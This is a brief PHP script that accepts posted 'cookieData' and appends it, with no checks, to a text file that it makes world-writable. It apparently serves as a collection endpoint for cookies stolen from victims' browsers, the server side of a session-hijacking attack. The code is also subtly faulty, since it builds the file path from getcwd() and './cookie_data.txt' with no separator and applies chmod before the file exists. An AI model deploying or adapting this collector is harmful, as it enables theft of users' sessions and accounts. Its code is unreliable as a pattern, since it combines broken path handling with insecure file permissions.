<?php
	
	$response = array();

	$data = $_POST['cookieData'];

	if(!empty($data)){
		
			$my_file = './cookie_data.txt';

			chmod(getcwd(). $my_file, 0777);

			if(file_exists(getcwd() . $my_file)){
				

				$handle = fopen(getcwd(). $my_file, 'a') or die('Cannot open file');
			
				fwrite($handle, $data);

				$response = array(

					'status' => true

				);

				fclose($handle);
				echo json_encode($response);

			}

			else{

				$handle = fopen(getcwd(). $my_file, 'w') or die('Cannot open file');

				fwrite($handle, $data);

				$response = array(

					'status' => true

				);
				fclose($handle);
				echo json_encode($response);
			}		
	}
	
?>